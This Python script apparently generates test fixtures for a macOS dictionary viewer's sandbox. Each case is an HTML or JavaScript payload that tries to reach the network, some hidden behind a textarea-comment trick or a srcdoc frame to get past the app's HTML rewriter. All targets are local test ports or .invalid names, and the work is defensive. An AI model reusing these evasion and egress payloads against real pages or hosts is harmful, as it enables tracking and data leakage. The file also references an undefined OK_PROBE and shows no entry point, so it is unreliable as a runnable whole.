#!/usr/bin/env python3
"""The hostile-input battery for the macOS entry view (plan-macos-v1 WI-4; ADR-0007 decision 14), adapted from spike 3's
(`dev-docs/measurements/2026-10-14-macos-confinement/tools/battery.py`). It describes one dictionary, written by the
core's own MDX writer (`conformance-fixtures`), whose every entry is one egress attempt:

    python3 -I battery.py            write conformance/fixtures/hostile/{dictionary.json,cases.json}
    python3 -I battery.py --check    exit 1 if either file differs from what this script writes

**Each payload at byte zero, and in each context the core's rewriter cannot see into** (ADR-0007 decision 14): the
payload is the whole record (`<id>`), or the same payload behind a comment opened in a `<textarea>` (`<id>~textarea`),
inside a `srcdoc` document (`~srcdoc`), written by a script (`~write`), and in an HTML resource under `r/` that the
entry frames (`~resource`, itself behind the textarea comment, since the core rewrites HTML resources too). SVG,
SMIL, meta refresh, self and top navigation, every worker kind, `<a ping>`, WebRTC ICE, DNS prefetch and preconnect
are payloads of their own. A redirect cannot be expressed: the view's scheme handler never answers one
(`SchemeTests.everyResponseCarriesThePolicyAndNoRedirect`).

Every target is the case's own: HTTP, TCP and UDP at 127.0.0.1 on its own ports, and names of its own under `.invalid`,
which mDNSResponder answers itself (spike 3, measured: no upstream query). Nothing here reaches the internet.

A page reports what it saw into its top document's `data-lab` attribute (`R`); the lab reads it from a content world of
its own, so the entry view's configuration is exactly the production one. It is part of the payload, not a defence.
**What the verdicts need does not depend on a page script** (2026-10-16): the core's strip list removes the battery's
scripts, so the lab itself records that a document loaded, and each case's `probe` (lab-world JavaScript returning
`[[key, value]]`) judges what must work. `scripts` is the case's script elements as a browser builds them (`script_elements`) and `scriptsVisible` those
the core reads as markup: fewer served than visible means the core stripped some, an outcome of its own, not a block;
the rest, behind a comment, the core drops with the comment (S2).
"""
import argparse
import base64
import html
import json
import os
import re
import struct
import sys

TCP0, UDP0 = 47100, 47400           # case i listens on TCP0+i and UDP0+i
CONTROL = {"http": 47090, "tcp": 47091, "udp": 47390}
TOKEN = "h1"                        # in every path and name: a line naming it is this battery's
HERE = os.path.dirname(os.path.abspath(__file__))
FIXTURE = os.path.normpath(os.path.join(HERE, "../../../../conformance/fixtures/hostile"))

PNG = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="
OK_SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="8" height="8"><rect width="8" height="8" fill="#3a6"/></svg>'


def wav() -> str:
    """The shortest sound the writer can carry: an MDD record is text, so every byte must be below 0x80. 8-bit mono
    at 8 kHz, 91 samples of 0x7F (near silence); the sizes stay below 128 and the rest of the header is ASCII."""
    frames = b"\x7f" * 91
    head = b"RIFF" + struct.pack("<I", 36 + len(frames)) + b"WAVEfmt " + struct.pack(
        "<IHHIIHH", 16, 1, 1, 8000, 8000, 1, 8) + b"data" + struct.pack("<I", len(frames))
    data = head + frames
    assert all(b < 0x80 for b in data)
    return data.decode("ascii")


def bmp() -> str:
    """A raster image an MDD record can carry (every byte below 0x80): a 4×4 24-bit BMP, 102 bytes. SVG images are not
    dragged out of a web view at all (measured on the E2E Mac 2026-10-14), so the reader's drag needs a raster one."""
    pixels = b"".join(bytes([0x20 + 8 * x, 0x60, 0x40 + 4 * y]) for y in range(4) for x in range(4))
    info = struct.pack("<IiiHHIIiiII", 40, 4, 4, 1, 24, 0, len(pixels), 0, 0, 0, 0)
    data = b"BM" + struct.pack("<IHHI", 14 + len(info) + len(pixels), 0, 0, 14 + len(info)) + info + pixels
    assert all(b < 0x80 for b in data)
    return data.decode("ascii")


# The page's report: appended to the top document's `data-lab` (a frame of the same origin reports to its top).
J = ("function R(k,d){try{var t;try{t=top.document.documentElement}catch(e){t=document.documentElement}"
     "var a=JSON.parse(t.getAttribute('data-lab')||'[]');a.push([String(k),d===undefined||d===null?null:String(d)]);"
     "t.setAttribute('data-lab',JSON.stringify(a))}catch(e){}}")


def S(code: str) -> str:
    return f"<script>{J};{code}</script>"


def later(code: str, ms: int = 400) -> str:
    """`code` after `ms`: long enough that the page's `loaded` report is read (the lab polls every 100 ms) before an
    attempt that navigates away takes the report with it."""
    return S(f"setTimeout(function(){{try{{{code}}}catch(e){{R('throw',e)}}}},{ms})")


class Ctx:
    def __init__(self, cid: str, index: int):
        self.id, self.tcp, self.udp = cid, TCP0 + index, UDP0 + index
        self.names: list[str] = []

    def H(self, leaf: str) -> str:
        return f"http://127.0.0.1:{self.tcp}/{TOKEN}/{self.id}/{leaf}"

    def ws(self, leaf: str) -> str:
        return f"ws://127.0.0.1:{self.tcp}/{TOKEN}/{self.id}/{leaf}"

    def name(self, label: str = "n") -> str:
        n = f"{label}-{self.id.replace('~', '-')}-{TOKEN}.invalid"
        assert len(n.split(".")[0]) <= 63, n
        self.names.append(n)
        return n

    def r(self, leaf: str) -> str:
        return f"xdict://d/r/{self.id}/{leaf}"


def worker_body(c: Ctx, kind: str) -> str:
    post = "p.postMessage" if kind == "shared" else "postMessage"
    pre = "var p={postMessage:function(){}};onconnect=function(e){p=e.ports[0];p.postMessage('shared-connected')};" \
        if kind == "shared" else ""
    return (pre +
            f"try{{fetch('{c.H(kind + '-fetch')}').then(function(){{{post}('fetch-ok')}},"
            f"function(e){{{post}('fetch-err '+e)}})}}catch(e){{{post}('fetch-throw '+e)}}\n"
            f"try{{importScripts('{c.H(kind + '-import.js')}')}}catch(e){{{post}('import-throw '+e)}}\n"
            f"try{{new WebSocket('{c.ws(kind + '-ws')}')}}catch(e){{{post}('ws-throw '+e)}}\n"
            f"{post}('{kind}-ran');")


def srcdoc(inner: str) -> str:
    return f'<iframe srcdoc="{html.escape(inner, quote=True)}"></iframe>'


def textarea(inner: str) -> str:
    """A comment opened inside `<textarea>`: the browser reads `<!--` there as text and the payload after
    `</textarea>` as markup; the core's tag scanner reads a comment and leaves the payload unrewritten."""
    return f"<textarea><!--</textarea>{inner}--></textarea>"


# The payloads (spike 3's, less its redirects), in order. Each builds (page, resources) for a case's context.
def payloads() -> list[tuple]:
    out: list[tuple] = []

    def add(cid, group, build, wait=2500, wrap=False, probe=""):
        out.append((cid, group, build, wait, wrap, probe))

    # ---- ordinary loads -------------------------------------------------------------------------------------------
    add("img", "ordinary", lambda c: (f'<img src="{c.H("img.png")}">', {}), wrap=True)
    add("img-srcset", "ordinary", lambda c: (
        f'<img srcset="{c.H("srcset.png")} 1x"><picture><source srcset="{c.H("picture.png")}"><img></picture>', {}),
        wrap=True)
    add("script", "ordinary", lambda c: (f'<script src="{c.H("script.js")}"></script>', {}), wrap=True)
    add("script-module", "ordinary", lambda c: (
        f'<script type="module" src="{c.H("module.js")}"></script>' +
        S(f"import('{c.H('dynamic-import.js')}').then(function(){{R('import','ok')}},function(e){{R('import','err '+e)}})"),
        {}))
    add("stylesheet", "ordinary", lambda c: (f'<link rel="stylesheet" href="{c.H("style.css")}">', {}), wrap=True)
    # The reading frame's stylesheets are DOM the page can reach: a page that deletes and rewrites them, and the root's
    # theme, then loads. Its loads are refused as ever; the frame's re-assert is reported (`frame-back`).
    add("frame-strip", "ordinary", lambda c: (later(
        "document.querySelectorAll('style[id^=xdict-frame-]').forEach(function(s){s.remove()});"
        "document.documentElement.setAttribute('data-xdict-theme','hostile');"
        "var y=document.createElement('style');y.id='xdict-frame-column';y.textContent="
        f"'body{{background:url(\\'{c.H('frame-bg.png')}\\')}}';document.head.appendChild(y);"
        f"var i=new Image();i.src='{c.H('frame-img.png')}';"
        "setTimeout(function(){R('frame-back',document.querySelectorAll('style[id^=xdict-frame-]').length+' '+"
        "document.documentElement.getAttribute('data-xdict-theme'))},300)"), {}))
    # A page script that writes random inline colours, backgrounds, borders and shadows in a loop (ODE's `o3.js` writes
    # `style.color='#000'`), 400 elements a tick, more than the shell's guard maps in one frame: the page ends on palette
    # tokens with no inline box, its own timers keep running to the end (a guard that fed itself would starve them and
    # `colour-end` would never come), and its one remote background is refused like any other load. `colour-end` is
    # non-token colours, inline boxes, the largest gap between ticks (ms, reported, not gated: a lab's view may be
    # throttled) and the ticks.
    add("colour-writer", "ordinary", lambda c: (
        '<div id="cw">' + "".join(f"<span>w{i} </span>" for i in range(400)) + "</div>" + S(
            "var els=document.querySelectorAll('#cw span'),t0=Date.now(),last=t0,gap=0,n=0;"
            "function rnd(){return '#'+('00000'+Math.floor(Math.random()*16777216).toString(16)).slice(-6)}"
            f"els[0].style.backgroundImage=\"url('{c.H('colour-bg.png')}')\";"
            "function done(){var bad=0,box=0;Array.prototype.forEach.call(els,function(e){var s=e.style;"
            "if(s.color&&!/^var\\(--xdict-/.test(s.color))bad++;"
            "if(s.backgroundColor||s.backgroundImage||s.borderTopWidth||s.boxShadow)box++});"
            "R('colour-end',bad+' '+box+' '+gap+' '+n)}"
            "function tick(){var now=Date.now();gap=Math.max(gap,now-last);last=now;"
            "for(var i=0;i<els.length;i++){var s=els[i].style;s.color=rnd();s.background=rnd();"
            "s.border='2px solid '+rnd();s.boxShadow='0 0 3px '+rnd()}"
            "n++;if(now-t0<1500)setTimeout(tick,0);else setTimeout(done,2500)}"
            "setTimeout(tick,0)"), {}), 6000)
    add("css-import", "ordinary", lambda c: (f'<style>@import url("{c.H("import.css")}");</style>', {}), wrap=True)
    add("css-url", "ordinary", lambda c: (
        f'<div style="width:40px;height:40px;background-image:url(\'{c.H("bg.png")}\')"></div>'
        f'<style>.x{{list-style-image:url("{c.H("list.png")}");cursor:url("{c.H("cursor.png")}"),auto;'
        f'border:10px solid;border-image:url("{c.H("border.png")}") 30;'
        f'-webkit-mask-image:url("{c.H("mask.png")}");background:image-set(url("{c.H("image-set.png")}") 1x)}}</style>'
        f'<ul class="x"><li>x</li></ul>', {}), wrap=True)
    add("font", "ordinary", lambda c: (
        f'<style>@font-face{{font-family:X;src:url("{c.H("font.woff")}") format("woff")}}</style>'
        f'<p style="font-family:X">abc</p>', {}), wrap=True)
    add("fetch", "ordinary", lambda c: (S(
        f"fetch('{c.H('fetch')}').then(function(r){{R('fetch','ok '+r.status)}},function(e){{R('fetch','err '+e)}})"), {}))
    add("xhr", "ordinary", lambda c: (S(
        f"try{{var x=new XMLHttpRequest();x.open('GET','{c.H('xhr')}');x.onload=function(){{R('xhr','ok')}};"
        f"x.onerror=function(){{R('xhr','error')}};x.send()}}catch(e){{R('xhr','throw '+e)}}"), {}))
    add("fetch-keepalive", "ordinary", lambda c: (S(
        f"fetch('{c.H('keepalive')}',{{method:'POST',keepalive:true,body:'x'}}).then(function(){{R('ka','ok')}},"
        f"function(e){{R('ka','err '+e)}})"), {}))
    add("beacon", "ordinary", lambda c: (S(f"R('beacon',navigator.sendBeacon('{c.H('beacon')}','x'))"), {}))
    add("eventsource", "ordinary", lambda c: (S(
        f"try{{var s=new EventSource('{c.H('es')}');s.onerror=function(){{R('es','error');s.close()}}}}"
        f"catch(e){{R('es','throw '+e)}}"), {}))
    add("websocket", "ordinary", lambda c: (S(
        f"try{{var w=new WebSocket('{c.ws('ws')}');w.onerror=function(){{R('ws','error')}}}}catch(e){{R('ws','throw '+e)}}"),
        {}))
    add("webtransport", "ordinary", lambda c: (S(
        f"R('wt-type',typeof WebTransport);try{{var t=new WebTransport('https://127.0.0.1:{c.udp}/{TOKEN}');"
        f"t.ready.then(function(){{R('wt','ready')}},function(e){{R('wt','err '+e)}})}}catch(e){{R('wt','throw '+e)}}"),
        {}), wait=3500)
    add("object-embed", "ordinary", lambda c: (
        f'<object data="{c.H("object.html")}" type="text/html"></object>'
        f'<embed src="{c.H("embed.html")}" type="text/html">', {}), wrap=True)
    add("misc-tags", "ordinary", lambda c: (
        f'<video poster="{c.H("poster.png")}"></video><input type="image" src="{c.H("input.png")}">'
        f'<link rel="icon" href="{c.H("icon.png")}"><link rel="manifest" href="{c.H("manifest.json")}">'
        f'<table background="{c.H("table.png")}"><tr><td>x</td></tr></table>', {}), wrap=True)
    add("preload", "ordinary", lambda c: (
        f'<link rel="preload" as="image" href="{c.H("preload.png")}">'
        f'<link rel="preload" as="fetch" crossorigin href="{c.H("preload-fetch")}">'
        f'<link rel="preload" as="style" href="{c.H("preload.css")}">'
        f'<link rel="preload" as="font" crossorigin href="{c.H("preload-font.woff")}">'
        f'<link rel="modulepreload" href="{c.H("modulepreload.js")}">', {}), wrap=True)
    add("prefetch", "speculative", lambda c: (
        f'<link rel="prefetch" href="{c.H("prefetch")}"><link rel="prerender" href="{c.H("prerender")}">'
        f'<link rel="next" href="{c.H("next")}">', {}))
    add("speculation-rules", "speculative", lambda c: (
        '<script type="speculationrules">' + json.dumps({
            "prefetch": [{"source": "list", "urls": [c.H("spec-prefetch")]}],
            "prerender": [{"source": "list", "urls": [c.H("spec-prerender")]}]}) + "</script>", {}))
    add("preconnect", "speculative", lambda c: (f'<link rel="preconnect" href="http://127.0.0.1:{c.tcp}">', {}),
        wrap=True)
    add("preconnect-name", "speculative", lambda c: (
        f'<link rel="preconnect" href="https://{c.name("pc")}:{c.tcp}">', {}), wrap=True)
    add("dns-prefetch", "speculative", lambda c: (
        f'<link rel="dns-prefetch" href="//{c.name("dp")}"><link rel="dns-prefetch" href="http://{c.name("dq")}/">',
        {}), wrap=True)
    add("dns-anchor", "speculative", lambda c: (f'<a href="https://{c.name("da")}/x">x</a>', {}), wrap=True)
    # Named targets are https: App Transport Security refuses cleartext HTTP to a name before any lookup (spike 3).
    add("img-name", "speculative", lambda c: (f'<img src="https://{c.name("im")}:{c.tcp}/{TOKEN}/x.png">', {}),
        wrap=True)
    add("fetch-name", "speculative", lambda c: (
        S(f"fetch('https://{c.name('fe')}:{c.tcp}/x').catch(function(){{}})"), {}))
    add("websocket-name", "speculative", lambda c: (
        S(f"try{{new WebSocket('wss://{c.name('ws')}:{c.tcp}/x')}}catch(e){{R('ws','throw '+e)}}"), {}))
    add("ping", "navigation", lambda c: (
        f'<a id="a" href="xdict://d/entry/landing" ping="{c.H("ping")}">x</a>' +
        later("document.getElementById('a').click()"), {}), wrap=True)
    add("csp-report-meta", "ordinary", lambda c: (
        f'<meta http-equiv="Content-Security-Policy" content="img-src \'none\'; report-uri {c.H("report")}">'
        f'<img src="{c.r("blocked.svg")}">', {"blocked.svg": OK_SVG}))

    # ---- media ----------------------------------------------------------------------------------------------------
    add("audio", "media", lambda c: (f'<audio src="{c.H("a.mp3")}" preload="auto" autoplay></audio>', {}), 3000,
        wrap=True)
    add("video", "media", lambda c: (
        f'<video src="{c.H("v.mp4")}" preload="auto" autoplay muted></video>'
        f'<video preload="auto" muted><source src="{c.H("source.mp4")}"></video>'
        f'<video src="{c.r("ok.wav")}" muted><track default kind="subtitles" src="{c.H("track.vtt")}"></video>',
        {"ok.wav": wav()}), 3000, wrap=True)
    add("hls", "media", lambda c: (
        f'<video src="{c.r("a.m3u8")}" preload="auto" autoplay muted></video>',
        {"a.m3u8": "#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:4\n#EXT-X-MEDIA-SEQUENCE:0\n"
                   f"#EXTINF:4.0,\n{c.H('seg0.ts')}\n#EXT-X-ENDLIST\n"}), 3500)
    add("media-js", "media", lambda c: (S(
        f"var a=new Audio('{c.H('js-audio.mp3')}');a.play().catch(function(e){{R('play','err '+e)}})"), {}), 3000)

    # ---- frames ---------------------------------------------------------------------------------------------------
    add("iframe-url", "frames", lambda c: (f'<iframe src="{c.H("iframe.html")}"></iframe>', {}), wrap=True)
    add("iframe-srcdoc", "frames", lambda c: (srcdoc(
        f'<img src="{c.H("srcdoc-img.png")}">' + S("R('srcdoc-ran',location.href)")), {}))
    add("iframe-srcdoc-fetch", "frames", lambda c: (srcdoc(S(
        f"R('srcdoc-ran',location.href);fetch('{c.H('srcdoc-fetch')}').then(function(){{R('sf','ok')}},"
        f"function(e){{R('sf','err '+e)}});navigator.sendBeacon('{c.H('srcdoc-beacon')}','x');"
        f"try{{new WebSocket('{c.ws('srcdoc-ws')}')}}catch(e){{R('sws','throw '+e)}}")), {}))
    add("iframe-srcdoc-nav", "frames", lambda c: (srcdoc(
        S("R('srcdoc-ran',location.href)") + later(f"location.href='{c.H('srcdoc-self-nav')}'")), {}))
    add("iframe-srcdoc-top", "frames", lambda c: (srcdoc(
        S("R('srcdoc-ran',location.href)") + later(f"top.location.href='{c.H('srcdoc-top-nav')}'")), {}))
    add("iframe-srcdoc-refresh", "frames", lambda c: (srcdoc(
        f'<meta http-equiv="refresh" content="0;url={c.H("srcdoc-refresh")}">' + S("R('srcdoc-ran',location.href)")),
        {}))
    add("iframe-srcdoc-scripted", "frames", lambda c: (later(
        "var f=document.createElement('iframe');f.srcdoc=" +
        json.dumps(f'<img src="{c.H("scripted-srcdoc.png")}">') + ";document.body.appendChild(f)"), {}))
    add("iframe-blank-write", "frames", lambda c: (later(
        "var f=document.createElement('iframe');document.body.appendChild(f);"
        "R('blank-doc',!!f.contentDocument);"
        f"f.contentDocument.write({json.dumps('<img src=' + chr(34) + c.H('blank-img.png') + chr(34) + '>')});"
        f"f.contentWindow.fetch('{c.H('blank-fetch')}').catch(function(){{}})"), {}))
    add("iframe-data", "frames", lambda c: (
        f'<iframe src="data:text/html,{html.escape("<img src=" + c.H("data-iframe.png") + ">", quote=True)}"></iframe>',
        {}))
    add("iframe-blob", "frames", lambda c: (later(
        "var b=new Blob([" + json.dumps(f'<img src="{c.H("blob-iframe.png")}">') + "],{type:'text/html'});"
        "var f=document.createElement('iframe');f.src=URL.createObjectURL(b);document.body.appendChild(f)"), {}))
    add("iframe-xdict", "frames", lambda c: (
        f'<iframe src="{c.r("inner.html")}"></iframe>', {"inner.html": textarea(f'<img src="{c.H("inner-img.png")}">')}))

    # ---- workers --------------------------------------------------------------------------------------------------
    page_worker = ("function W(make){try{var w=make();w.onmessage=function(e){R('worker',e.data)};"
                   "w.onerror=function(e){R('worker-error',e.message||'error')}}catch(e){R('worker-throw',e)}}")
    page_shared = ("function SW(make){try{var w=make();w.port.onmessage=function(e){R('shared',e.data)};"
                   "w.port.start();w.onerror=function(e){R('shared-error',e.message||'error')}}"
                   "catch(e){R('shared-throw',e)}}")
    add("worker-xdict", "workers", lambda c: (S(page_worker + f"W(function(){{return new Worker('{c.r('w.js')}')}})"),
                                               {"w.js": worker_body(c, "dedicated")}))
    add("worker-blob", "workers", lambda c: (S(
        page_worker + "var b=new Blob([" + json.dumps(worker_body(c, "dedicated")) + "],{type:'text/javascript'});"
        "W(function(){return new Worker(URL.createObjectURL(b))})"), {}))
    add("worker-data", "workers", lambda c: (S(
        page_worker + "W(function(){return new Worker('data:text/javascript,'+encodeURIComponent(" +
        json.dumps(worker_body(c, "dedicated")) + "))})"), {}))
    add("worker-http", "workers", lambda c: (S(page_worker + f"W(function(){{return new Worker('{c.H('w-http.js')}')}})"),
                                              {}))
    add("sharedworker-xdict", "workers", lambda c: (S(
        page_shared + f"R('sw-type',typeof SharedWorker);SW(function(){{return new SharedWorker('{c.r('s.js')}')}})"),
        {"s.js": worker_body(c, "shared")}))
    add("sharedworker-blob", "workers", lambda c: (S(
        page_shared + "var b=new Blob([" + json.dumps(worker_body(c, "shared")) + "],{type:'text/javascript'});"
        "SW(function(){return new SharedWorker(URL.createObjectURL(b))})"), {}))
    add("serviceworker", "workers", lambda c: (S(
        "R('sw-present','serviceWorker' in navigator);"
        "if('serviceWorker' in navigator){"
        f"navigator.serviceWorker.register('{c.r('sw.js')}').then(function(){{R('sw','registered')}},"
        "function(e){R('sw','reject '+e)});"
        f"navigator.serviceWorker.register('{c.H('sw-http.js')}').then(function(){{R('sw-http','registered')}},"
        "function(e){R('sw-http','reject '+e)})}"),
        {"sw.js": f"self.addEventListener('install',function(){{fetch('{c.H('sw-install-fetch')}')}});"
                  f"fetch('{c.H('sw-top-fetch')}');"}))
    add("audioworklet", "workers", lambda c: (S(
        "try{var a=new AudioContext();R('aw-type',typeof a.audioWorklet);"
        f"a.audioWorklet.addModule('{c.H('worklet.js')}').then(function(){{R('aw','ok')}},function(e){{R('aw','err '+e)}})"
        "}catch(e){R('aw','throw '+e)}"), {}))

    # ---- navigation -----------------------------------------------------------------------------------------------
    # One second, not zero: a refresh at once leaves before the page's report can be read, and the case is void.
    add("meta-refresh", "navigation", lambda c: (f'<meta http-equiv="refresh" content="1;url={c.H("refresh")}">', {}),
        wrap=True)
    add("nav-location", "navigation", lambda c: (later(f"location.href='{c.H('location')}'"), {}))
    add("nav-api", "navigation", lambda c: (later(
        f"R('nav-type',typeof navigation);navigation.navigate('{c.H('navigation-api')}')"), {}))
    add("window-open", "navigation", lambda c: (later(f"R('open',!!window.open('{c.H('window-open')}'))"), {}))
    add("window-open-blank-write", "navigation", lambda c: (later(
        "var w=window.open('');R('open',!!w);"
        f"if(w){{w.document.write({json.dumps('<img src=' + chr(34) + c.H('popup-img.png') + chr(34) + '>')});"
        f"w.fetch('{c.H('popup-fetch')}').catch(function(){{}})}}"), {}))
    add("form-post", "navigation", lambda c: (
        f'<form id="f" action="{c.H("form-post")}" method="post"><input name="a" value="b"></form>' +
        later("document.getElementById('f').submit()"), {}), wrap=True)
    add("form-blank", "navigation", lambda c: (
        f'<form id="f" action="{c.H("form-blank")}" target="_blank"><input name="a" value="b"></form>' +
        later("document.getElementById('f').submit()"), {}))
    add("anchor-click", "navigation", lambda c: (
        f'<a id="a" href="{c.H("anchor")}">x</a>' + later("document.getElementById('a').click()"), {}), wrap=True)
    add("anchor-click-name", "navigation", lambda c: (
        f'<a id="a" href="https://{c.name("an")}:{c.tcp}/x">x</a>' + later("document.getElementById('a').click()"),
        {}), wrap=True)
    add("anchor-click-https", "navigation", lambda c: (
        f'<a id="a" href="https://127.0.0.1:{c.tcp}/{TOKEN}/{c.id}/x">x</a>' +
        later("document.getElementById('a').click()"), {}))
    add("anchor-detached", "navigation", lambda c: (later(
        f"var a=document.createElement('a');a.href='https://127.0.0.1:{c.tcp}/{TOKEN}/{c.id}/detached';a.click()"),
        {}))
    add("anchor-in-srcdoc", "navigation", lambda c: (srcdoc(
        f'<a id="a" href="https://127.0.0.1:{c.tcp}/{TOKEN}/{c.id}/in-srcdoc">x</a>' +
        later("document.getElementById('a').click()")), {}))
    add("anchor-top-from-srcdoc", "navigation", lambda c: (srcdoc(
        f'<a id="a" target="_top" href="https://127.0.0.1:{c.tcp}/{TOKEN}/{c.id}/top-from-srcdoc">x</a>' +
        later("document.getElementById('a').click()")), {}))
    add("anchor-in-blank-frame", "navigation", lambda c: (later(
        "var f=document.createElement('iframe');document.body.appendChild(f);var d=f.contentDocument;"
        f"d.body.innerHTML='<a href=\"https://127.0.0.1:{c.tcp}/{TOKEN}/{c.id}/in-blank\">x</a>';"
        "d.querySelector('a').click()"), {}))
    add("anchor-blank", "navigation", lambda c: (
        f'<a id="a" target="_blank" href="{c.H("anchor-blank")}">x</a>' + later("document.getElementById('a').click()"),
        {}), wrap=True)
    add("anchor-download", "navigation", lambda c: (
        f'<a id="a" download="x.bin" href="{c.H("download.bin")}">x</a>' + later("document.getElementById('a').click()"),
        {}), wrap=True)
    add("nav-data-url", "navigation", lambda c: (later(
        "location.href='data:text/html,'+encodeURIComponent(" +
        json.dumps(f'<img src="{c.H("data-nav.png")}">') + ")"), {}))
    add("nav-blob-url", "navigation", lambda c: (later(
        "var b=new Blob([" + json.dumps(f'<img src="{c.H("blob-nav.png")}">' + S(f"fetch('{c.H('blob-nav-fetch')}')")) +
        "],{type:'text/html'});location.href=URL.createObjectURL(b)"), {}))
    add("nav-svg-doc", "navigation", lambda c: (later(f"location.href='{c.r('evil.svg')}'"), {
        "evil.svg": '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="20" '
                    f'height="20"><image href="{c.H("svgdoc-image.png")}" width="10" height="10"/>'
                    f'<script>fetch("{c.H("svgdoc-fetch")}")</script></svg>'}))
    add("nav-xdict-html", "navigation", lambda c: (later(f"location.href='{c.r('page.html')}'"), {
        "page.html": textarea(f'<img src="{c.H("resource-page-img.png")}">')}))
    add("base-href", "navigation", lambda c: (
        f'<base href="{c.H("base/")}"><img src="rel.png"><a id="a" href="rel-nav">x</a>' +
        later("R('base',document.baseURI);document.getElementById('a').click()", 600), {}), wrap=True)

    # ---- SVG and SMIL ---------------------------------------------------------------------------------------------
    svg = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="60" height="60">'
    add("svg-image", "svg", lambda c: (svg + f'<image href="{c.H("svg-image.png")}" width="10" height="10"/>'
                                       f'<image xlink:href="{c.H("svg-xlink-image.png")}" width="10" height="10"/></svg>',
                                       {}))
    add("svg-cdata", "svg", lambda c: (
        svg + f'<![CDATA[x]]><image href="{c.H("cdata-image.png")}" width="10" height="10"/></svg>', {}))
    add("svg-use", "svg", lambda c: (svg + f'<use href="{c.H("use.svg")}#a"/></svg>', {}))
    add("svg-feimage", "svg", lambda c: (
        svg + f'<filter id="f"><feImage href="{c.H("feimage.png")}"/></filter>'
        '<rect filter="url(#f)" width="10" height="10"/></svg>', {}))
    add("svg-a-click", "svg", lambda c: (
        svg + f'<a id="s" href="{c.H("svg-a")}"><rect width="50" height="50"/></a></svg>' +
        later("document.getElementById('s').dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true,"
              "view:window}))"), {}))
    add("smil-set-image", "svg", lambda c: (
        svg + f'<image href="{c.r("ok.svg")}" width="10" height="10">'
        f'<set attributeName="href" to="{c.H("smil-set.png")}" begin="0s"/></image>'
        f'<image xlink:href="{c.r("ok.svg")}" width="10" height="10">'
        f'<animate attributeName="xlink:href" values="{c.H("smil-animate-xlink.png")}" dur="5s" begin="0s"/>'
        '</image></svg>', {"ok.svg": OK_SVG}))
    add("smil-animate-a", "svg", lambda c: (
        svg + '<a id="s" href="xdict://d/entry/landing">'
        f'<animate attributeName="href" values="{c.H("smil-a")}" dur="10s" begin="0s"/>'
        '<rect width="50" height="50"/></a></svg>' +
        later("R('href',document.getElementById('s').href.animVal);"
              "document.getElementById('s').dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true,"
              "view:window}))", 600), {}))
    add("textarea-comment", "ordinary", lambda c: (textarea(f'<img src="{c.H("textarea.png")}">'), {}))

    # ---- WebRTC ---------------------------------------------------------------------------------------------------
    rtc = ("function go(cfg){if(typeof RTCPeerConnection==='undefined'){R('rtc','absent');return}"
           "try{var pc=new RTCPeerConnection(cfg);pc.onicecandidate=function(e){R('cand',e.candidate?"
           "e.candidate.candidate:'end')};pc.createDataChannel('x');pc.createOffer().then(function(o){"
           "return pc.setLocalDescription(o)}).then(function(){R('rtc','offer-set')},function(e){R('rtc','err '+e)})"
           "}catch(e){R('rtc','throw '+e)}}")
    add("rtc-stun", "webrtc", lambda c: (S(rtc + f"go({{iceServers:[{{urls:'stun:127.0.0.1:{c.udp}'}}]}})"), {}), 4000)
    add("rtc-stun-name", "webrtc", lambda c: (S(rtc + f"go({{iceServers:[{{urls:'stun:{c.name('st')}:{c.udp}'}}]}})"),
                                              {}), 4000)
    add("rtc-turn", "webrtc", lambda c: (S(
        rtc + f"go({{iceServers:[{{urls:['turn:127.0.0.1:{c.tcp}?transport=tcp','turn:127.0.0.1:{c.udp}?transport=udp'],"
        "username:'u',credential:'p'}]})"), {}), 4000)
    add("rtc-remote-candidate", "webrtc", lambda c: (S(
        "if(typeof RTCPeerConnection==='undefined'){R('rtc','absent')}else{"
        "var a=new RTCPeerConnection(),b=new RTCPeerConnection();a.createDataChannel('x');"
        "a.createOffer().then(function(o){return a.setLocalDescription(o).then(function(){"
        "return b.setRemoteDescription(o)})}).then(function(){return b.createAnswer()}).then(function(ans){"
        "return a.setRemoteDescription(ans)}).then(function(){return a.addIceCandidate({candidate:"
        f"'candidate:1 1 udp 2122260223 127.0.0.1 {c.udp} typ host',sdpMid:'0',sdpMLineIndex:0}})}})"
        ".then(function(){R('rtc','remote-added')},function(e){R('rtc','err '+e)})}"), {}), 4500)
    add("rtc-host", "webrtc", lambda c: (S(rtc + "go({iceServers:[]})"), {}), 4000)

    # ---- what must still work under every layer ---------------------------------------------------------------------
    add("ok-xdict", "allowed", lambda c: (
        S("") +  # R first: ok.js calls it as soon as it runs
        f'<img src="{c.r("ok.svg")}" onload="R(\'ok\',\'img\')" onerror="R(\'bad\',\'img\')">'
        f'<img src="data:image/png;base64,{PNG}" onload="R(\'ok\',\'data-img\')" onerror="R(\'bad\',\'data-img\')">'
        f'<link rel="stylesheet" href="{c.r("ok.css")}" onload="R(\'ok\',\'css\')" onerror="R(\'bad\',\'css\')">'
        f'<script src="{c.r("ok.js")}" onerror="R(\'bad\',\'script\')"></script>'
        f'<audio src="{c.r("ok.wav")}" preload="auto" oncanplay="R(\'ok\',\'audio\')" onerror="R(\'bad\',\'audio\')">'
        '</audio>' + S("R('ok','inline');eval(\"R('ok','eval')\");new Function(\"R('ok','function')\")()"),
        {"ok.svg": OK_SVG, "ok.css": "body{color:rgb(1,2,3)}", "ok.js": "R('ok','script')", "ok.wav": wav()}), 3000,
        probe=OK_PROBE)
    # A remote image the core rewrote: the shell's placeholder, naming the host, loads; nothing is fetched.
    add("ok-placeholder", "allowed", lambda c: (
        S("") + f'<img id="p" src="https://{c.name("ph")}:{c.tcp}/x.png" '
        'onload="R(\'ok\',\'placeholder \'+this.naturalWidth)" onerror="R(\'bad\',\'placeholder\')">', {}),
        probe="var p=document.getElementById('p');"
              "return p&&p.complete&&p.naturalWidth>0?[['ok','placeholder '+p.naturalWidth]]:[]")
    # A link the lab follows itself, once, from its own world: what is proven is the view's routing, not a page script.
    add("ok-link-nav", "allowed", lambda c: ('<a id="go" href="xdict://d/entry/landing">landing</a>', {}),
        probe="if(!window.__go){window.__go=1;setTimeout(function(){var g=document.getElementById('go');"
              "if(g)g.click()},400)}return []")
    return out


